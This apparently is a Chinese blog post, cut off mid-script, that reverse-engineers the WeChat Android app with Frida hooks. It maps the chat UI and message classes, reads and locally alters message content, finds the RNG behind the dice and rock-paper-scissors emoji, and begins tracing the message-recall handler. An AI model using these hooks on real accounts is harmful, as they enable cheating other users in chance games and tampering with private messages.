<p>再找控件ID，最终定位到<code>com.tencent.mm.ui.chatting.view.MMChattingListView</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815003515022.png" alt="image-20210815003515022"></p>
<h3 id="分析">分析<a class="header-anchor" href="#分析"> ¶ </a></h3>
<h4 id="MMChattingListView">MMChattingListView<a class="header-anchor" href="#MMChattingListView"> ¶ </a></h4>
<p>这是一个<code>ListView</code></p>
<p>发现了List的<code>Adapter</code>，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815004245534.png" alt="image-20210815004245534"></p>
<p>交叉引用查看是哪里调用了这个方法</p>
<p>跟到<code>com.tencent.mm.ui.chatting.ChattingUIFragment</code>的<code>fTJ</code>方法</p>
<h4 id="ChattingUIFragment">ChattingUIFragment<a class="header-anchor" href="#ChattingUIFragment"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815004604975.png" alt="image-20210815004604975"></p>
<p>发现这个<code>Fragment</code>对Adapter进行了设置，同时存放在了<code>this.Lrn</code>字段</p>
<p>其中<code>this.Lrr</code>类型为<code>MMChattingListView</code>，<code>this.Lro</code>的类型为<code>ListView</code></p>
<p>也可以得到Adapter的类型为<code>com.tencent.mm.ui.chatting.a.a</code>，同时继承了<code>BaseAdapter</code></p>
<h4 id="Adapter">Adapter<a class="header-anchor" href="#Adapter"> ¶ </a></h4>
<p>根据其重写的<code>getCount</code>方法，得到数据源是<code>this.LtF</code>字段</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815010612094.png" alt="image-20210815010612094"></p>
<p>而<code>this.LtF</code>字段的定义是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public SparseArray LtF;</span><br></pre></td></tr></table></figure>
<p>使用frida hook一下，查看一下SparseArray每个元素的类型</p>
<p>随便hook了一个Fragment的<code>zt</code>方法（因为看Log日志每次操作都会执行）</p>
<p>获得Fragment的<code>Lrn</code>字段也就是Adapter</p>
<p>再直接调用<code>getCount()</code>和<code>getItem()</code>获取到数据源的单个数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.ui.chatting.ChattingUIFragment&#x27;</span>);</span><br><span class="line">    clazz.zt.implementation = function() &#123;</span><br><span class="line">        console.log(<span class="string">&quot;this.Lrn.value&quot;</span>,<span class="keyword">this</span>.Lrn.value);</span><br><span class="line">        <span class="keyword">var</span> adapter = Java.cast(<span class="keyword">this</span>.Lrn.value,Java.use(<span class="string">&quot;com.tencent.mm.ui.chatting.a.a&quot;</span>))</span><br><span class="line">        console.log(<span class="string">&quot;adapter&quot;</span>,adapter);</span><br><span class="line">        console.log(<span class="string">&quot;adapter.getCount&quot;</span>,adapter.getCount());</span><br><span class="line">        console.log(<span class="string">&quot;LtF&quot;</span>,adapter.LtF.value);</span><br><span class="line">        <span class="keyword">var</span> adapter_size = adapter.getCount();</span><br><span class="line">        <span class="keyword">var</span> msg = adapter.getItem(<span class="number">0</span>);</span><br><span class="line">        console.log(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">        <span class="keyword">return</span> clazz.zt.apply(<span class="keyword">this</span>, arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>此时手机界面为</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//img.png" alt="img"></p>
<p>获得输出为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">this.Lrn.value com.tencent.mm.ui.chatting.a.a@f945978</span><br><span class="line">adapter com.tencent.mm.ui.chatting.a.a@f945978</span><br><span class="line">adapter.getCount 5</span><br><span class="line">LtF &#123;0=com.tencent.mm.storage.bz@cc74ce8, 1=com.tencent.mm.storage.bz@dba9f01, 2=com.tencent.mm.storage.bz@ae31a6, 3=com.tencent.mm.storage.bz@9afe7e7, 4=com.tencent.mm.storage.bz@c384f94&#125;</span><br><span class="line">msg com.tencent.mm.storage.bz@cc74ce8</span><br></pre></td></tr></table></figure>
<p>可以知道每个数据的类型是<code>com.tencent.mm.storage.bz</code></p>
<h4 id="每条消息-storage-bz">每条消息 <a href="http://storage.bz">storage.bz</a><a class="header-anchor" href="#每条消息-storage-bz"> ¶ </a></h4>
<p>该类的继承关系为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.tencent.mm.storage.bz</span><br><span class="line">com.tencent.mm.ah.aa</span><br><span class="line">com.tencent.mm.g.c.ej</span><br><span class="line">com.tencent.mm.sdk.e.c</span><br></pre></td></tr></table></figure>
<p>查看个方法，发现里面有如下字段</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815143427853.png" alt="image-20210815143427853"></p>
<p>这些字段是<code>ej</code>类的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815144136894.png" alt="image-20210815144136894"></p>
<p>同时<code>bz</code>还有5个子类</p>
<p><code>bz$a</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815152148504.png" alt="image-20210815152148504"></p>
<p><code>bz$b</code>，大概是有关位置的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815152234412.png" alt="image-20210815152234412"></p>
<p><code>bz$c</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815152302867.png" alt="image-20210815152302867"></p>
<p><code>bz$d</code>，可以看到<code>nickname</code>, <code>cityCode</code>, <code>CountryCode</code>字段</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815152614851.png" alt="image-20210815152614851"></p>
<h3 id="脚本实现">脚本实现<a class="header-anchor" href="#脚本实现"> ¶ </a></h3>
<p>最终选择hook的是Adapter的<code>notifyDataSetChanged</code>方法，这样可以对最后的消息进行查看以及修改</p>
<p>修改一下消息内容</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">    clazz.notifyDataSetChanged.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">this</span>.LtF.value;</span><br><span class="line">        <span class="keyword">var</span> data_size = data.size();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;data_size&quot;</span>,data_size);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;data_size;++i)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Message&quot;</span>+i,Java.cast(data.get(i),Java.use(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).field_content.value);</span><br><span class="line">        &#125;</span><br><span class="line">        Java.cast(data.get(<span class="number">5</span>),Java.use(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).field_content.value = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;heheheheh&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> clazz.notifyDataSetChanged.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>运行脚本之前的界面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//img-1629011094588.png" alt="img"></p>
<p>可以得到以下输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notifyDataSetChanged</span><br><span class="line">data_size 7</span><br><span class="line">Message0 1</span><br><span class="line">Message1 2</span><br><span class="line">Message2 3</span><br><span class="line">Message3 4</span><br><span class="line">Message4 5</span><br><span class="line">Message5 哈哈哈哈哈哈哈哈哈哈哈哈</span><br><span class="line">Message6 6</span><br></pre></td></tr></table></figure>
<p>同时界面被修改为了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//img-1629011192790.png" alt="img"></p>
<p>当然只能修改本地数据（虽然没什么卵用）</p>
<p>同时json输出该消息的数据结构为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.tencent.mm.storage.bz</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;KzF&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;KzG&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;Zq&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;__hadSetcreateTime&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;__hadSettype&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;dvP&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;eBD&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eBO&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eBf&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEH&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;eEI&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;eEL&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEM&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEN&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEO&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEP&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEQ&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eER&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eES&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEf&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEg&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEh&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEj&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;eEq&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;ewj&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;ewq&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;exe&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;fdE&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;fdF&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;fdI&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdJ&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdK&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdL&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdM&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;fdN&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdO&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdP&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdQ&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdR&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdS&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdT&quot;</span>: [],</span><br><span class="line">    <span class="attr">&quot;fdU&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdV&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fdW&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;fdX&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;field_bizChatId&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">    <span class="attr">&quot;field_bizClientMsgId&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;field_content&quot;</span>: <span class="string">&quot;&quot;</span>,            <span class="comment">// 聊天内容</span></span><br><span class="line">    <span class="attr">&quot;field_createTime&quot;</span>: <span class="number">1629009756000</span>,      <span class="comment">// 聊天时间戳</span></span><br><span class="line">    <span class="attr">&quot;field_flag&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;field_isSend&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;field_isShowTimer&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;field_lvbuffer&quot;</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">125</span>],</span><br><span class="line">    <span class="attr">&quot;field_msgId&quot;</span>: <span class="number">00</span>,                      <span class="comment">// 消息id</span></span><br><span class="line">    <span class="attr">&quot;field_msgSeq&quot;</span>: <span class="number">000000000</span>,</span><br><span class="line">    <span class="attr">&quot;field_msgSvrId&quot;</span>: <span class="number">4746617000000000000</span>,</span><br><span class="line">    <span class="attr">&quot;field_status&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;field_talker&quot;</span>: <span class="string">&quot;wxid_00000000000000&quot;</span>,  <span class="comment">// 对话的微信用户ida</span></span><br><span class="line">    <span class="attr">&quot;field_talkerId&quot;</span>: <span class="number">00</span>,</span><br><span class="line">    <span class="attr">&quot;field_type&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;systemRowid&quot;</span>: <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中接收到的消息比发送的消息要多了几个字段（普通文本消息）</p>
<h3 id="类总结">类总结<a class="header-anchor" href="#类总结"> ¶ </a></h3>
<p>因此可以分析到聊天窗口UI以及数据的类为</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>类名</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Fragment</code></td>
<td><code>com.tencent.mm.ui.chatting.ChattingUIFragment</code></td>
</tr>
<tr>
<td><code>ListView</code></td>
<td><code>com.tencent.mm.ui.chatting.view.MMChattingListView</code></td>
</tr>
<tr>
<td><code>Adapter</code></td>
<td><code>com.tencent.mm.ui.chatting.a.a</code></td>
</tr>
<tr>
<td>单条消息类</td>
<td><code>com.tencent.mm.storage.bz</code></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="vx投骰子">vx投骰子<a class="header-anchor" href="#vx投骰子"> ¶ </a></h2>
<h3 id="分析-2">分析<a class="header-anchor" href="#分析-2"> ¶ </a></h3>
<p>先用DDMS的记录功能找到点击事件为<code>com.tencent.mm.emoji.panel.a.q$1.onClick()</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816123125656.png" alt="image-20210816123125656"></p>
<p>随后进入了<code>glG.a</code>方法，也就是<code>com.tencent.mm.emoji.panel.a.d.a()</code>方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816123331547.png" alt="image-20210816123331547"></p>
<p>frida调试<code>arg14.type</code>一直等于0</p>
<p>刚开始没咋看代码，然后去了<code>v0_2.A(v6)</code>方法，然后找了三四层。😕后来发现里面的有的方法不止是投骰子的时候才被调用才发觉找错了。</p>
<p>然后frida查看了一下<code>v1.getGroup()</code>，发现我添加的自定义表情是<code>81</code>，而骰子和石头剪刀布都是<code>18</code>；同时<code>EmojiGroupInfo.Qbd</code>也为<code>18</code></p>
<p>然后分析<code>.getProvider().p(v1)</code>方法，交叉引用有多个，分别是<code>com.tencent.mm.ca.a.p()</code>和<code>com.tencent.mm.plugin.emoji.e.f.p()</code></p>
<p>frida打印调用信息发现<code>com.tencent.mm.ca.a.p()</code>先被调用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816124809022.png" alt="image-20210816124809022"></p>
<p>frida调试发现进入了<code>getEmojiMgr().p(arg9)</code>方法，也就是<code>com.tencent.mm.plugin.emoji.e.f.p()</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816130822813.png" alt="image-20210816130822813"></p>
<p>Cursor是数据库的游标，通过<code>aec</code>方法来查询相应内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816132210776.png" alt="image-20210816132210776"></p>
<p>然后<code>v0.moveToPosition(v1)</code>让游标v0移动到v1位置</p>
<p><code>arg6.convertFrom(v0)</code>这个方法，位于<code>EmojiInfo</code>的父类<code>com.tencent.mm.g.c.bj</code>，查询该行相应的值然后给字段赋值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816132511952.png" alt="image-20210816132511952"></p>
<p>之后发送的emoji表情就是这个<code>arg6</code>了</p>
<p>所以看<code>int v1 = bu.jE(v0.getCount() - 1, 0);</code></p>
<p>frida得到，石头剪刀布<code>getCount()</code>为3；而投骰子<code>getCount()</code>为6</p>
<p>查看<code>com.tencent.mm.sdk.platformtools.bu.jE()</code>方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816132833909.png" alt="image-20210816132833909"></p>
<blockquote>
<p>public int nextInt(int n)</p>
<p>该方法的作用是生成一个随机的int值,该值介于[0,n)的区间,也就是0到n之间的随机int值,包含0而不包含n。</p>
</blockquote>
<p><code>arg6</code>是恒为0的。也就是说返回的v0是介于<code>[0,arg5]</code>的。</p>
<p>经Frida调试，骰子点数1-6对应着0-5；剪刀石头布分别对应着0 1 2</p>
<p>若想修改相应点数，直接hook该函数返回值就好</p>
<p>相应堆栈信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.tencent.mm.sdk.platformtools.bu.jE(Native Method)</span><br><span class="line">com.tencent.mm.plugin.emoji.e.f.p(SourceFile:91)</span><br><span class="line">com.tencent.mm.plugin.emoji.e.f.p(Native Method)</span><br><span class="line">com.tencent.mm.ca.a.p(SourceFile:240)</span><br><span class="line">com.tencent.mm.ca.a.p(Native Method)</span><br><span class="line">com.tencent.mm.emoji.panel.a.d.a(SourceFile:66)</span><br><span class="line">com.tencent.mm.emoji.panel.a.d.a(Native Method)</span><br><span class="line">com.tencent.mm.emoji.panel.a.q<span class="variable">$1</span>.onClick(SourceFile:41)</span><br><span class="line">android.view.View.performClick(View.java:6294)</span><br><span class="line">android.view.View<span class="variable">$PerformClick</span>.run(View.java:24770)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:790)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:6494)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.RuntimeInit<span class="variable">$MethodAndArgsCaller</span>.run(RuntimeInit.java:438)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:807)</span><br></pre></td></tr></table></figure>
<h3 id="脚本实现-2">脚本实现<a class="header-anchor" href="#脚本实现-2"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">    clazz.jE.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;bu.jE arguments&quot;</span>+i,<span class="built_in">arguments</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> result = clazz.jE.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">arguments</span>[<span class="number">0</span>]==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;石头剪刀布结果为:&quot;</span>,result==<span class="number">0</span>?<span class="string">&quot;剪刀&quot;</span>:result==<span class="number">1</span>?<span class="string">&quot;石头&quot;</span>:<span class="string">&quot;布&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;骰子点数为:&quot;</span>,result+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 进行修改</span></span><br><span class="line">        <span class="comment">// result = Java.use(&quot;java.lang.Integer&quot;).parseInt(&quot;1&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="vx防撤回">vx防撤回<a class="header-anchor" href="#vx防撤回"> ¶ </a></h2>
<h3 id="分析-3">分析<a class="header-anchor" href="#分析-3"> ¶ </a></h3>
<p>防撤回难点是监听消息啥时候发送过来，真没啥思路。刚开始从聊天页面的ListView的<code>notifyDataSetChanged</code>开始回溯，回溯了好久找不到。</p>
<p>就搜索Log日志<code>revoke</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816160615130.png" alt="image-20210816160615130"></p>
<p>然后去类中搜索字符串定位到<code>com.tencent.mm.plugin.msgquote.PluginMsgQuote.handleRevokeMsgBySvrId</code></p>
<p>打印一下堆栈信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.tencent.mm.plugin.msgquote.PluginMsgQuote.handleRevokeMsgBySvrId(Native Method)</span><br><span class="line">com.tencent.mm.model.f.a(SourceFile:2190)</span><br><span class="line">com.tencent.mm.model.ch.b(SourceFile:258)</span><br><span class="line">com.tencent.mm.s.b.b(SourceFile:40)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.processAddMsg(SourceFile:165)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.a(SourceFile:1059)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.f.a(SourceFile:118)</span><br><span class="line">com.tencent.mm.plugin.zero.c.a(SourceFile:57)</span><br><span class="line">com.tencent.mm.modelmulti.q$a$1.onTimerExpired(SourceFile:830)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aw.handleMessage(SourceFile:86)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aq$2.handleMessage(SourceFile:362)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aq$2.dispatchMessage(SourceFile:350)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.os.HandlerThread.run(HandlerThread.java:65)</span><br></pre></td></tr></table></figure>
<p>之后写出如下frida脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">    clazz.handleRevokeMsgBySvrId.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;8 handleRevokeMsgBySvrId&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.handleRevokeMsgBySvrId.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.model.f&#x27;</span>);</span><br><span class="line">    clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;7 f.a()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">    clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span 